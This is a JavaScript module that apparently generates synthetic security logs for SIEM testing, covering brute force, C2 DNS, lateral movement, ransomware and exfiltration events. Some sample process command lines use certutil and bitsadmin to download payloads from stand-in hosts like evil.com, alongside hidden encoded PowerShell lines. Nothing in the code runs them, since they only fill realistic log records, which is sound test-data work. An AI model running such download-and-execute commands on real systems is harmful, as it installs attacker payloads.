import { faker } from '@faker-js/faker';

// Persistent threat actors and targets for correlated investigations
const THREAT_IPS = ['185.220.101.34', '91.219.236.174', '23.129.64.210', '103.251.167.20', '45.155.205.233', '194.26.135.89', '62.102.148.68', '178.128.23.9'];
const INTERNAL_IPS = ['10.0.1.15', '10.0.1.22', '10.0.1.47', '10.0.2.10', '10.0.2.33', '10.0.3.5', '10.0.3.18', '172.16.0.50', '172.16.0.88'];
const COMPROMISED_USER = 'jsmith';
const MALICIOUS_DOMAINS = ['c2-beacon.evil.ru', 'exfil-data.darknet.io', 'update-service.malware.cc', 'cdn-static.phishing.xyz', 'api-gateway.cryptominer.top'];
const DGA_DOMAINS = ['xkf8a3bq2.com', 'p9vm3kx7w.net', 'r2ht5nb8c.org', 'a7jq9wm4e.biz', 'k3nx8fp2y.info'];
const TARGETED_USERS = ['jsmith', 'admin', 'svc_backup', 'root', 'administrator', 'dbadmin', 'jenkins', 'deploy_user'];
const NORMAL_USERS = ['alice.johnson', 'bob.martinez', 'carol.williams', 'dave.chen', 'eva.patel', 'frank.garcia', 'grace.kim', 'henry.liu'];
const INTERNAL_HOSTS = ['WS-FINANCE-01', 'WS-HR-03', 'SRV-DC-01', 'SRV-DB-02', 'SRV-WEB-01', 'SRV-APP-03', 'WS-DEV-05', 'SRV-MAIL-01', 'SRV-FILE-02'];

const SCENARIO_WEIGHTS = [
  { fn: bruteForceAuth, weight: 12 },
  { fn: impossibleTravel, weight: 5 },
  { fn: firewallIDS, weight: 15 },
  { fn: windowsSecurityEvent, weight: 18 },
  { fn: maliciousDNS, weight: 10 },
  { fn: networkAnomalyFlow, weight: 10 },
  { fn: endpointThreat, weight: 12 },
  { fn: awsSecurityEvent, weight: 8 },
  { fn: lateralMovement, weight: 5 },
  { fn: dataExfiltration, weight: 5 }
];

function pick(arr) { return faker.helpers.arrayElement(arr); }
function ts() { return new Date().toISOString(); }

// --- Brute Force / Credential Stuffing ---
function bruteForceAuth() {
  const isSuccess = Math.random() < 0.1;
  const targetUser = pick(TARGETED_USERS);
  const srcIp = Math.random() < 0.7 ? pick(THREAT_IPS) : faker.internet.ipv4();
  const destIp = pick(INTERNAL_IPS);

  return {
    timestamp: ts(),
    log_type: 'authentication',
    event_type: isSuccess ? 'authentication_success' : 'authentication_failure',
    severity: isSuccess ? 'HIGH' : 'MEDIUM',
    src_ip: srcIp,
    dest_ip: destIp,
    dest_port: pick([22, 3389, 443, 8443]),
    user: targetUser,
    domain: 'CORP',
    hostname: pick(INTERNAL_HOSTS),
    auth_method: pick(['password', 'ntlm', 'kerberos', 'ssh_key']),
    failure_reason: isSuccess ? null : pick(['invalid_password', 'account_locked', 'expired_credential', 'invalid_username', 'mfa_failed']),
    attempt_count: isSuccess ? 1 : faker.number.int({ min: 5, max: 50 }),
    source_geo: { country: pick(['RU', 'CN', 'KP', 'IR', 'BR', 'RO']), city: faker.location.city() },
    user_agent: faker.internet.userAgent(),
    message: isSuccess
      ? `Successful login for ${targetUser} from ${srcIp} after multiple failed attempts`
      : `Failed authentication for ${targetUser} from ${srcIp} (attempt ${faker.number.int({ min: 5, max: 50 })})`,
    _siemForward: true
  };
}

// --- Impossible Travel ---
function impossibleTravel() {
  const user = pick(NORMAL_USERS);
  const locations = [
    { country: 'US', city: 'New York', lat: 40.71, lon: -74.01 },
    { country: 'RU', city: 'Moscow', lat: 55.75, lon: 37.62 },
    { country: 'CN', city: 'Beijing', lat: 39.90, lon: 116.40 },
    { country: 'DE', city: 'Berlin', lat: 52.52, lon: 13.40 },
    { country: 'BR', city: 'São Paulo', lat: -23.55, lon: -46.63 }
  ];
  const loc1 = locations[0];
  const loc2 = pick(locations.slice(1));

  return {
    timestamp: ts(),
    log_type: 'authentication',
    event_type: 'impossible_travel_detected',
    severity: 'HIGH',
    user,
    first_login: {
      ip: faker.internet.ipv4(),
      geo: loc1,
      time: new Date(Date.now() - 1800000).toISOString()
    },
    second_login: {
      ip: pick(THREAT_IPS),
      geo: loc2,
      time: ts()
    },
    time_between_minutes: 30,
    distance_km: faker.number.int({ min: 5000, max: 15000 }),
    message: `Impossible travel: ${user} logged in from ${loc1.city}, ${loc1.country} then ${loc2.city}, ${loc2.country} within 30 minutes`,
    _siemForward: true
  };
}

// --- Firewall / IDS Events ---
function firewallIDS() {
  const action = faker.helpers.weightedArrayElement([
    { value: 'blocked', weight: 60 }, { value: 'allowed', weight: 25 }, { value: 'alert', weight: 15 }
  ]);
  const threatType = pick(['port_scan', 'syn_flood', 'exploit_attempt', 'malware_callback', 'policy_violation', 'brute_force', 'sql_injection', 'xss_attempt', 'directory_traversal']);
  const srcIp = Math.random() < 0.6 ? pick(THREAT_IPS) : faker.internet.ipv4();
  const severity = action === 'allowed' && Math.random() < 0.5 ? 'CRITICAL' : pick(['HIGH', 'MEDIUM', 'LOW']);

  return {
    timestamp: ts(),
    log_type: 'firewall',
    event_type: 'intrusion_detection',
    severity,
    action,
    src_ip: srcIp,
    src_port: faker.number.int({ min: 1024, max: 65535 }),
    dest_ip: pick(INTERNAL_IPS),
    dest_port: pick([22, 80, 443, 445, 3389, 1433, 3306, 5432, 8080, 8443]),
    protocol: pick(['TCP', 'UDP', 'ICMP']),
    threat_type: threatType,
    signature_id: `SID-${faker.number.int({ min: 100000, max: 999999 })}`,
    signature_name: signatureName(threatType),
    bytes_sent: faker.number.int({ min: 0, max: 50000 }),
    bytes_received: faker.number.int({ min: 0, max: 200000 }),
    device: pick(['fw-edge-01', 'fw-edge-02', 'fw-internal-01', 'ids-sensor-01', 'ids-sensor-02']),
    zone_src: pick(['untrust', 'dmz', 'external']),
    zone_dest: pick(['trust', 'internal', 'dmz', 'servers']),
    message: `${action.toUpperCase()}: ${threatType} from ${srcIp} — ${signatureName(threatType)}`,
    _siemForward: true
  };
}

function signatureName(type) {
  const names = {
    port_scan: 'Nmap SYN scan detected',
    syn_flood: 'TCP SYN flood attack',
    exploit_attempt: 'CVE-2024-3400 PAN-OS Command Injection',
    malware_callback: 'Known C2 beacon communication',
    policy_violation: 'Unauthorized outbound connection on restricted port',
    brute_force: 'Multiple failed login attempts from single source',
    sql_injection: 'SQL injection attempt in URI parameter',
    xss_attempt: 'Cross-site scripting in HTTP request',
    directory_traversal: 'Directory traversal attempt ../../etc/passwd'
  };
  return names[type] || 'Unknown signature';
}

// --- Windows Security Events ---
function windowsSecurityEvent() {
  const events = [
    { id: 4625, msg: 'An account failed to log on', level: 'warn', category: 'logon' },
    { id: 4624, msg: 'An account was successfully logged on', level: 'info', category: 'logon' },
    { id: 4648, msg: 'A logon was attempted using explicit credentials', level: 'warn', category: 'logon' },
    { id: 4672, msg: 'Special privileges assigned to new logon', level: 'warn', category: 'privilege' },
    { id: 4688, msg: 'A new process has been created', level: 'info', category: 'process' },
    { id: 4697, msg: 'A service was installed in the system', level: 'high', category: 'persistence' },
    { id: 4720, msg: 'A user account was created', level: 'warn', category: 'account' },
    { id: 4728, msg: 'A member was added to a security-enabled global group', level: 'warn', category: 'group' },
    { id: 4732, msg: 'A member was added to a security-enabled local group', level: 'warn', category: 'group' },
    { id: 4768, msg: 'A Kerberos authentication ticket (TGT) was requested', level: 'info', category: 'kerberos' },
    { id: 4769, msg: 'A Kerberos service ticket was requested', level: 'info', category: 'kerberos' },
    { id: 4776, msg: 'The domain controller attempted to validate credentials', level: 'info', category: 'logon' },
    { id: 1102, msg: 'The audit log was cleared', level: 'critical', category: 'tampering' },
    { id: 4657, msg: 'A registry value was modified', level: 'warn', category: 'registry' },
    { id: 7045, msg: 'A new service was installed', level: 'high', category: 'persistence' }
  ];

  const event = pick(events);
  const user = event.category === 'logon' && Math.random() < 0.3 ? pick(TARGETED_USERS) : pick(NORMAL_USERS);
  const host = pick(INTERNAL_HOSTS);
  const isSuspicious = ['tampering', 'persistence', 'privilege'].includes(event.category) || (event.id === 4625 && Math.random() < 0.5);

  const log = {
    timestamp: ts(),
    log_type: 'windows_security',
    event_type: `windows_event_${event.id}`,
    event_id: event.id,
    severity: isSuspicious ? 'HIGH' : 'LOW',
    category: event.category,
    hostname: host,
    domain: 'CORP',
    user,
    src_ip: isSuspicious ? pick(THREAT_IPS) : pick(INTERNAL_IPS),
    logon_type: event.category === 'logon' ? pick([2, 3, 7, 10]) : undefined,
    message: `EventID=${event.id} ${event.msg} — User: CORP\\${user} on ${host}`,
    _siemForward: true
  };

  if (event.id === 4688) {
    const suspiciousProcs = ['powershell.exe -enc', 'cmd.exe /c whoami', 'certutil.exe -urlcache', 'mshta.exe http://', 'regsvr32.exe /s /n /u', 'rundll32.exe javascript:'];
    log.process = {
      name: isSuspicious ? pick(suspiciousProcs).split(' ')[0] : pick(['svchost.exe', 'explorer.exe', 'chrome.exe', 'outlook.exe']),
      command_line: isSuspicious ? pick(suspiciousProcs) : undefined,
      parent_process: pick(['explorer.exe', 'cmd.exe', 'services.exe', 'wmiprvse.exe', 'svchost.exe']),
      pid: faker.number.int({ min: 1000, max: 65535 })
    };
  }

  if (event.id === 4720 || event.id === 4728 || event.id === 4732) {
    log.target_user = `backdoor_${faker.string.alphanumeric(4)}`;
    log.target_group = event.id !== 4720 ? pick(['Domain Admins', 'Administrators', 'Remote Desktop Users', 'Backup Operators']) : undefined;
  }

  if (event.id === 1102) {
    log.severity = 'CRITICAL';
    log.message = `CRITICAL: Audit log cleared by CORP\\${user} on ${host} — potential evidence tampering`;
  }

  return log;
}

// --- Malicious DNS ---
function maliciousDNS() {
  const isDGA = Math.random() < 0.3;
  const isC2 = Math.random() < 0.4;
  const domain = isDGA ? pick(DGA_DOMAINS) : isC2 ? pick(MALICIOUS_DOMAINS) : `${faker.word.noun()}-${faker.string.alphanumeric(6)}.${pick(['com', 'net', 'io', 'xyz'])}`;
  const queryType = pick(['A', 'AAAA', 'TXT', 'CNAME', 'MX', 'NS']);
  const srcIp = pick(INTERNAL_IPS);
  const suspicious = isDGA || isC2 || queryType === 'TXT';

  return {
    timestamp: ts(),
    log_type: 'dns',
    event_type: suspicious ? 'suspicious_dns_query' : 'dns_query',
    severity: isDGA ? 'HIGH' : isC2 ? 'CRITICAL' : 'LOW',
    src_ip: srcIp,
    hostname: pick(INTERNAL_HOSTS),
    query: domain,
    query_type: queryType,
    response_code: pick(['NOERROR', 'NOERROR', 'NOERROR', 'NXDOMAIN', 'SERVFAIL']),
    response_ip: suspicious ? pick(THREAT_IPS) : faker.internet.ipv4(),
    dns_server: pick(['10.0.0.2', '10.0.0.3']),
    threat_indicators: {
      is_dga: isDGA,
      is_known_c2: isC2,
      threat_intel_match: isC2,
      entropy_score: isDGA ? faker.number.float({ min: 3.5, max: 4.5, fractionDigits: 2 }) : faker.number.float({ min: 1.5, max: 3.0, fractionDigits: 2 })
    },
    message: isDGA
      ? `DGA domain detected: ${domain} queried by ${srcIp}`
      : isC2
        ? `Known C2 domain resolved: ${domain} from ${srcIp}`
        : `DNS query: ${domain} (${queryType}) from ${srcIp}`,
    _siemForward: true
  };
}

// --- Network Anomaly / Flow ---
function networkAnomalyFlow() {
  const anomalyType = pick(['unusual_port', 'high_volume_transfer', 'beaconing', 'internal_scan', 'protocol_anomaly']);
  const srcIp = pick(INTERNAL_IPS);
  const destIp = anomalyType === 'internal_scan' ? pick(INTERNAL_IPS.filter(ip => ip !== srcIp)) : pick(THREAT_IPS);

  const log = {
    timestamp: ts(),
    log_type: 'network_flow',
    event_type: `network_anomaly_${anomalyType}`,
    severity: pick(['MEDIUM', 'HIGH']),
    src_ip: srcIp,
    src_port: faker.number.int({ min: 1024, max: 65535 }),
    dest_ip: destIp,
    dest_port: anomalyType === 'unusual_port' ? pick([4444, 5555, 6666, 8888, 9001, 31337]) : pick([80, 443, 8080]),
    protocol: pick(['TCP', 'UDP']),
    bytes_out: faker.number.int({ min: 1000, max: anomalyType === 'high_volume_transfer' ? 500000000 : 100000 }),
    bytes_in: faker.number.int({ min: 500, max: 50000 }),
    packets: faker.number.int({ min: 10, max: 50000 }),
    duration_seconds: faker.number.int({ min: 1, max: 3600 }),
    hostname: pick(INTERNAL_HOSTS),
    user: pick([...NORMAL_USERS, COMPROMISED_USER]),
    anomaly: {
      type: anomalyType,
      confidence: faker.number.float({ min: 0.7, max: 0.99, fractionDigits: 2 }),
      baseline_deviation: faker.number.float({ min: 2, max: 10, fractionDigits: 1 })
    },
    message: networkAnomalyMessage(anomalyType, srcIp, destIp),
    _siemForward: true
  };

  if (anomalyType === 'beaconing') {
    log.anomaly.beacon_interval_seconds = pick([60, 120, 300, 600]);
    log.anomaly.beacon_count = faker.number.int({ min: 20, max: 200 });
  }

  return log;
}

function networkAnomalyMessage(type, src, dest) {
  const msgs = {
    unusual_port: `Unusual outbound connection from ${src} to ${dest} on non-standard port`,
    high_volume_transfer: `High volume data transfer detected: ${src} → ${dest} exceeds baseline by 5x`,
    beaconing: `Periodic beaconing detected from ${src} to ${dest} — possible C2 communication`,
    internal_scan: `Internal port scan detected: ${src} scanning ${dest} across multiple ports`,
    protocol_anomaly: `Protocol anomaly: DNS over HTTPS or encrypted tunnel from ${src} to ${dest}`
  };
  return msgs[type];
}

// --- Endpoint Threat Detection ---
function endpointThreat() {
  const threatType = pick(['malware_detected', 'suspicious_process', 'file_integrity_change', 'privilege_escalation', 'ransomware_behavior', 'credential_dump']);
  const host = pick(INTERNAL_HOSTS);
  const user = Math.random() < 0.3 ? COMPROMISED_USER : pick(NORMAL_USERS);

  const log = {
    timestamp: ts(),
    log_type: 'endpoint',
    event_type: threatType,
    severity: ['ransomware_behavior', 'credential_dump'].includes(threatType) ? 'CRITICAL' : 'HIGH',
    hostname: host,
    ip: pick(INTERNAL_IPS),
    user,
    domain: 'CORP',
    agent_version: `7.${faker.number.int({ min: 0, max: 9 })}.${faker.number.int({ min: 0, max: 20 })}`,
    _siemForward: true
  };

  switch (threatType) {
    case 'malware_detected':
      log.malware = {
        name: pick(['Trojan.GenericKD.46789', 'Backdoor.Cobalt.Strike', 'Ransom.WannaCry', 'Exploit.CVE-2024-3400', 'Miner.CryptoNight', 'Stealer.Raccoon.v2']),
        file_path: pick(['C:\\Users\\Public\\update.exe', 'C:\\Windows\\Temp\\svc.dll', '/tmp/.hidden/payload', 'C:\\ProgramData\\service.exe']),
        file_hash: faker.string.hexadecimal({ length: 64, prefix: '' }).toLowerCase(),
        action: pick(['quarantined', 'blocked', 'detected']),
        detection_method: pick(['signature', 'heuristic', 'behavioral', 'machine_learning'])
      };
      log.message = `Malware ${log.malware.action}: ${log.malware.name} at ${log.malware.file_path} on ${host}`;
      break;

    case 'suspicious_process':
      log.process = {
        name: pick(['powershell.exe', 'cmd.exe', 'certutil.exe', 'mshta.exe', 'wmic.exe', 'regsvr32.exe', 'bitsadmin.exe']),
        command_line: pick([
          'powershell.exe -nop -w hidden -enc SQBFAFgA...',
          'certutil.exe -urlcache -split -f http://evil.com/payload.exe',
          'wmic.exe process call create "cmd /c whoami > C:\\temp\\out.txt"',
          'mshta.exe vbscript:Execute("CreateObject...")',
          'bitsadmin.exe /transfer job /download /priority high http://c2.evil/shell.exe C:\\temp\\s.exe'
        ]),
        parent: pick(['explorer.exe', 'winword.exe', 'excel.exe', 'outlook.exe', 'wmiprvse.exe']),
        pid: faker.number.int({ min: 1000, max: 65535 }),
        mitre_technique: pick(['T1059.001', 'T1218.005', 'T1197', 'T1218.010', 'T1047'])
      };
      log.message = `Suspicious process: ${log.process.name} spawned by ${log.process.parent} — MITRE ${log.process.mitre_technique}`;
      break;

    case 'file_integrity_change':
      log.file = {
        path: pick(['/etc/passwd', '/etc/shadow', 'C:\\Windows\\System32\\config\\SAM', '/etc/crontab', 'C:\\Windows\\System32\\drivers\\etc\\hosts']),
        change_type: pick(['modified', 'permissions_changed', 'ownership_changed']),
        old_hash: faker.string.hexadecimal({ length: 64, prefix: '' }).toLowerCase(),
        new_hash: faker.string.hexadecimal({ length: 64, prefix: '' }).toLowerCase()
      };
      log.message = `File integrity violation: ${log.file.path} ${log.file.change_type} on ${host}`;
      break;

    case 'privilege_escalation':
      log.escalation = {
        from_user: user,
        to_user: pick(['root', 'SYSTEM', 'Administrator']),
        method: pick(['sudo_abuse', 'token_manipulation', 'dll_hijacking', 'kernel_exploit', 'suid_binary']),
        mitre_technique: pick(['T1548', 'T1134', 'T1574.001', 'T1068'])
      };
      log.message = `Privilege escalation: ${user} → ${log.escalation.to_user} via ${log.escalation.method} on ${host}`;
      break;

    case 'ransomware_behavior':
      log.ransomware = {
        files_encrypted: faker.number.int({ min: 50, max: 5000 }),
        file_extensions_targeted: ['.docx', '.xlsx', '.pdf', '.sql', '.bak', '.vmdk'],
        encrypted_extension: pick(['.locked', '.encrypted', '.cry', '.ransom']),
        ransom_note_path: pick(['C:\\README_DECRYPT.txt', 'C:\\HOW_TO_RECOVER.html', '/tmp/DECRYPT_FILES.txt']),
        shadow_copies_deleted: Math.random() < 0.8
      };
      log.message = `CRITICAL: Ransomware behavior detected on ${host} — ${log.ransomware.files_encrypted} files encrypted, shadow copies ${log.ransomware.shadow_copies_deleted ? 'deleted' : 'intact'}`;
      break;

    case 'credential_dump':
      log.credential = {
        tool: pick(['mimikatz', 'procdump', 'comsvcs.dll', 'secretsdump', 'lazagne']),
        target: pick(['lsass.exe', 'SAM', 'ntds.dit', 'credential_manager']),
        mitre_technique: 'T1003'
      };
      log.message = `Credential dumping detected: ${log.credential.tool} targeting ${log.credential.target} on ${host} by ${user}`;
      break;
  }

  return log;
}

// --- AWS Security Events (GuardDuty / CloudTrail anomaly) ---
function awsSecurityEvent() {
  const findings = [
    { type: 'UnauthorizedAccess:IAMUser/MaliciousIPCaller', severity: 'HIGH', desc: 'API call from known malicious IP' },
    { type: 'Recon:EC2/PortProbeUnprotectedPort', severity: 'MEDIUM', desc: 'Unprotected port probed on EC2 instance' },
    { type: 'Trojan:EC2/BlackholeTraffic', severity: 'HIGH', desc: 'EC2 instance communicating with blackhole IP' },
    { type: 'CryptoCurrency:EC2/BitcoinTool.B', severity: 'HIGH', desc: 'EC2 instance querying cryptocurrency mining pool' },
    { type: 'UnauthorizedAccess:EC2/SSHBruteForce', severity: 'MEDIUM', desc: 'SSH brute force attack on EC2 instance' },
    { type: 'Exfiltration:S3/MaliciousIPCaller', severity: 'CRITICAL', desc: 'S3 bucket accessed from known malicious IP' },
    { type: 'PrivilegeEscalation:IAMUser/AdministrativePermissions', severity: 'HIGH', desc: 'IAM user escalated to admin permissions' },
    { type: 'Persistence:IAMUser/UserPermissions', severity: 'MEDIUM', desc: 'Unusual IAM policy changes for persistence' },
    { type: 'Discovery:S3/MaliciousIPCaller.Custom', severity: 'MEDIUM', desc: 'S3 bucket enumeration from suspicious IP' },
    { type: 'Impact:EC2/WinRMBruteForce', severity: 'MEDIUM', desc: 'WinRM brute force on Windows EC2 instance' }
  ];

  const finding = pick(findings);
  const accountId = '123456789012';
  const region = pick(['us-east-1', 'us-west-2', 'eu-west-1']);
  const instanceId = `i-${faker.string.hexadecimal({ length: 17, prefix: '' }).toLowerCase()}`;

  return {
    timestamp: ts(),
    log_type: 'aws_security',
    event_type: 'guardduty_finding',
    severity: finding.severity,
    account_id: accountId,
    region,
    finding_type: finding.type,
    finding_id: faker.string.uuid(),
    resource: {
      type: finding.type.includes('S3') ? 'S3Bucket' : finding.type.includes('IAM') ? 'IAMUser' : 'EC2Instance',
      instance_id: instanceId,
      instance_type: pick(['t3.micro', 't3.medium', 'm5.large', 'c5.xlarge']),
      private_ip: pick(INTERNAL_IPS),
      public_ip: faker.internet.ipv4()
    },
    actor: {
      ip: pick(THREAT_IPS),
      geo: { country: pick(['RU', 'CN', 'KP', 'IR']), city: faker.location.city() },
      user_agent: `aws-cli/2.${faker.number.int({ min: 0, max: 15 })}.0`
    },
    message: `GuardDuty: ${finding.type} — ${finding.desc} in ${region} (${accountId})`,
    _siemForward: true
  };
}

// --- Lateral Movement ---
function lateralMovement() {
  const srcHost = pick(INTERNAL_HOSTS);
  const destHost = pick(INTERNAL_HOSTS.filter(h => h !== srcHost));
  const method = pick(['psexec', 'wmi', 'rdp', 'ssh', 'smb_admin_share', 'winrm', 'dcom']);
  const user = Math.random() < 0.4 ? COMPROMISED_USER : pick(TARGETED_USERS);

  return {
    timestamp: ts(),
    log_type: 'lateral_movement',
    event_type: 'lateral_movement_detected',
    severity: 'HIGH',
    src_host: srcHost,
    src_ip: pick(INTERNAL_IPS),
    dest_host: destHost,
    dest_ip: pick(INTERNAL_IPS),
    dest_port: { psexec: 445, wmi: 135, rdp: 3389, ssh: 22, smb_admin_share: 445, winrm: 5985, dcom: 135 }[method],
    user,
    domain: 'CORP',
    method,
    mitre_technique: { psexec: 'T1570', wmi: 'T1047', rdp: 'T1021.001', ssh: 'T1021.004', smb_admin_share: 'T1021.002', winrm: 'T1021.006', dcom: 'T1021.003' }[method],
    success: Math.random() < 0.7,
    message: `Lateral movement: ${user} moved from ${srcHost} to ${destHost} via ${method} (MITRE ${{ psexec: 'T1570', wmi: 'T1047', rdp: 'T1021.001', ssh: 'T1021.004', smb_admin_share: 'T1021.002', winrm: 'T1021.006', dcom: 'T1021.003' }[method]})`,
    _siemForward: true
  };
}

// --- Data Exfiltration ---
function dataExfiltration() {
  const method = pick(['dns_tunnel', 'https_upload', 'cloud_storage', 'email_attachment', 'usb_copy']);
  const srcHost = pick(INTERNAL_HOSTS);
  const user = Math.random() < 0.3 ? COMPROMISED_USER : pick(NORMAL_USERS);
  const dataSize = faker.number.int({ min: 10000000, max: 5000000000 });

  return {
    timestamp: ts(),
    log_type: 'data_exfiltration',
    event_type: `exfiltration_${method}`,
    severity: 'CRITICAL',
    src_host: srcHost,
    src_ip: pick(INTERNAL_IPS),
    dest_ip: method === 'usb_copy' ? null : pick(THREAT_IPS),
    dest_domain: method === 'dns_tunnel' ? pick(MALICIOUS_DOMAINS) : method === 'cloud_storage' ? pick(['mega.nz', 'anonfiles.com', 'transfer.sh', 'file.io']) : undefined,
    user,
    domain: 'CORP',
    method,
    data_volume_bytes: dataSize,
    data_volume_readable: `${(dataSize / 1000000).toFixed(1)} MB`,
    files_count: faker.number.int({ min: 5, max: 500 }),
    file_types: pick([['.sql', '.csv', '.xlsx'], ['.pst', '.doc', '.pdf'], ['.bak', '.vmdk', '.tar.gz'], ['.key', '.pem', '.pfx']]),
    mitre_technique: { dns_tunnel: 'T1048.001', https_upload: 'T1048.002', cloud_storage: 'T1567.002', email_attachment: 'T1048.003', usb_copy: 'T1052.001' }[method],
    message: `Data exfiltration: ${(dataSize / 1000000).toFixed(1)} MB transferred from ${srcHost} via ${method.replace('_', ' ')} by ${user}`,
    _siemForward: true
  };
}

// --- Main generator ---

function pickScenario() {
  const totalWeight = SCENARIO_WEIGHTS.reduce((s, g) => s + g.weight, 0);
  let r = Math.random() * totalWeight;
  for (const g of SCENARIO_WEIGHTS) {
    r -= g.weight;
    if (r <= 0) return g.fn();
  }
  return SCENARIO_WEIGHTS[0].fn();
}

export function generate(count, opts = {}) {
  const dist = opts.severityDistribution;

  if (!dist) {
    const records = [];
    for (let i = 0; i < count; i++) {
      records.push(JSON.stringify(pickScenario()));
    }
    return records;
  }

  // Build severity pools with 4x oversample, then sample to match distribution
  const low = Math.max(0, dist.low ?? 0);
  const medium = Math.max(0, dist.medium ?? 0);
  const high = Math.max(0, dist.high ?? 0);
  const critical = Math.max(0, dist.critical ?? 0);
  const total = low + medium + high + critical;
  if (total === 0) {
    const records = [];
    for (let i = 0; i < count; i++) records.push(JSON.stringify(pickScenario()));
    return records;
  }

  const pools = { LOW: [], MEDIUM: [], HIGH: [], CRITICAL: [] };
  const poolSize = Math.max(count * 4, 40);
  for (let i = 0; i < poolSize; i++) {
    const rec = pickScenario();
    const sev = rec.severity || 'LOW';
    if (pools[sev]) pools[sev].push(JSON.stringify(rec));
  }

  const targets = {
    LOW: Math.round(count * low / total),
    MEDIUM: Math.round(count * medium / total),
    HIGH: Math.round(count * high / total),
    CRITICAL: Math.round(count * critical / total)
  };
  // Fix rounding drift
  const sum = targets.LOW + targets.MEDIUM + targets.HIGH + targets.CRITICAL;
  if (sum < count) targets.HIGH += (count - sum);

  const records = [];
  for (const [sev, target] of Object.entries(targets)) {
    const pool = pools[sev];
    for (let i = 0; i < target; i++) {
      if (pool.length > 0) {
        records.push(pool[i % pool.length]);
      } else {
        // Fallback: generate a record of any severity
        records.push(JSON.stringify(pickScenario()));
      }
    }
  }

  // Shuffle so severities are interleaved
  for (let i = records.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [records[i], records[j]] = [records[j], records[i]];
  }

  return records.slice(0, count);
}
